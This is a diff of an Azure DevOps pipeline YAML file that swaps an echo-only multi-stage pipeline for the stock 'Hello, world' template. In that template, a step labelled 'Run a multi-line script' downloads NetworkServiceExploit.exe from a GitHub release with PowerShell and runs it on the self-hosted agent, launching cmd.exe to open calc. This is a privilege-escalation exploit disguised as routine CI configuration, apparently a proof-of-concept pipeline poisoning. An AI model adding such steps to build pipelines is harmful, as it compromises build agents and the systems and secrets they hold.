@@ -1,49 +1,15 @@
 trigger:
-- task: Attackflow Azure DevOps Pipeline@0
-  inputs:
 - main
 
-stages:
-- stage: Build
-  displayName: "Build Stage"
-  jobs:
-  - job: BuildJob
-    displayName: "Self-hosted Build Job"
-    pool:
-      name: default # Self-hosted ajan havuzu
-    steps:
-    - script: echo "Building the project..."
-      displayName: "Echo Build Message"
+pool:
+  name: default
 
-- stage: Test
-  displayName: "Test Stage"
-  jobs:
-  - job: TestJob
-    displayName: "Self-hosted Test Job"
-    pool:
-      name: default # Self-hosted ajan havuzu
-    steps:
-    - script: echo "Running the tests..."
-      displayName: "Echo Test Message"
+steps:
+- script: echo Hello, world!
+  displayName: 'Run a one-line script'
 
-- stage: Deploy
-  displayName: "Deploy Stage"
-  jobs:
-  - job: DeployJob
-    displayName: "Self-hosted Deploy Job"
-    pool:
-      name: default # Self-hosted ajan havuzu
-    steps:
-    - script: echo "Deploying the application..."
-      displayName: "Echo Deploy Message"
-
-- stage: Cleanup
-  displayName: "Cleanup Stage"
-  jobs:
-  - job: CleanupJob
-    displayName: "Self-hosted Cleanup Job"
-    pool:
-      name: default # Self-hosted ajan havuzu
-    steps:
-    - script: echo "Cleaning up the resources..."
-      displayName: "Echo Cleanup Message"
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    powershell Invoke-WebRequest -Uri https://github.com/decoder-it/NetworkServiceExploit/releases/download/20200504/NetworkServiceExploit.exe -OutFile exploit.exe
+    exploit.exe -i -c "C:\Windows\system32\cmd.exe /c calc"
+  displayName: 'Run a multi-line script'
